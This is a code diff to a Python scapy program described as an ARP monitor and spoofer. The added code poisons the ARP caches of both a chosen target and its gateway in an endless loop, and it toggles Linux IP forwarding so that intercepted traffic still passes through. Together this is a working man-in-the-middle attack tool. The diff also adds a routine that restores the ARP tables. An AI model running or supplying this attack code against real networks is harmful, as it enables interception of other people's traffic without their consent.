@@ -4,6 +4,7 @@ from scapy.all import *
 from scapy.modules import *
 from scapy import *
 import scapy.all as scapy
+from sys import platform
 
 
 
@@ -40,6 +41,22 @@ def get_mac_of_target(target_ip, packet_dict):
     else:
         print('Target IP not found in ARP packets. Please try again.')
         main()
+    
+def toggle_IP_forward():
+    if platform == 'linux' or platform == 'linux2':            
+        path = '/proc/sys/net/ipv4/ip_forward'
+        with open(path, "rb") as file:
+                if file.read() == b'1':
+                    with open(path, "wb") as file:
+                        file.write(b'0')
+                else:
+                    with open(path, "wb") as file:
+                        file.write(b'1')
+    elif platform == 'darwin':
+        print('MacOS not supported yet.')
+        exit()
+    elif platform == 'win32':
+        print('Enable IP forwarding with "run" regedit: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters')
 
 def view_working_pcap():
     packets = read_bytes_from_pcap()
@@ -47,17 +64,25 @@ def view_working_pcap():
         print(f'MAC: {k} | Src.IP: {packets[k][1]}')
 
 def spoof(target_ip, gateway_ip):
-    target_mac = get_mac_of_target(target_ip, read_bytes_from_pcap())
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
-    scapy.send(packet, verbose=True)
-    
+    packet_dict = read_bytes_from_pcap()
+    target1_mac = get_mac_of_target(target_ip, packet_dict)
+    gateway_mac = get_mac_of_target(gateway_ip, packet_dict)
 
+    scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac))
+    scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
+    
+def send_fix(target_ip, gateway_ip):
+    packet_dict = read_bytes_from_pcap()
+    target1_mac = get_mac_of_target(target_ip, packet_dict)
+    gateway_mac = get_mac_of_target(gateway_ip, packet_dict)
+    scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target1_mac))
+    scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac))
 
 def main():
 
     print('Welcome to the ARP monitor and spoofer') #lets make a better name for this lol
-    user_in = input('What would you like to do? (1) Monitor ARP packets (2) Spoof ARP packets (3) View working pcap (4) Exit\n')
-    if user_in != '1' and user_in != '2' and user_in != '3' and user_in != '4':
+    user_in = input('What would you like to do? (1) Monitor ARP packets (2) Spoof ARP packets (3) View working pcap (4) Toggle IP Forwarding (5) Fix ARP spoof (6) Exit \n')
+    if user_in != '1' and user_in != '2' and user_in != '3' and user_in != '4' and user_in != '5' and user_in != '6':
         print('Invalid input. Please try again.')
         main()
     elif user_in == '1':
@@ -69,11 +94,20 @@ def main():
         target = input('What is the target IP? ')
         gateway = input('What is the gateway IP? ')
         print('Spoofing ARP packets...')
-        spoof(target, gateway)
+        print('Press CTRL+C to stop spoofing.')
+        while True:
+            spoof(target, gateway)
     elif user_in == '3':
         view_working_pcap()
     elif user_in == '4':
-        print('Exiting...')
+        toggle_IP_forward()
+    elif user_in == '5':
+        target = input('What is the target IP? ')
+        gateway = input('What is the gateway IP? ')
+        print('Fixing ARP packets...')
+        for _ in range (16):
+            send_fix(target, gateway)
+    elif user_in == '6':
         exit()
 
 
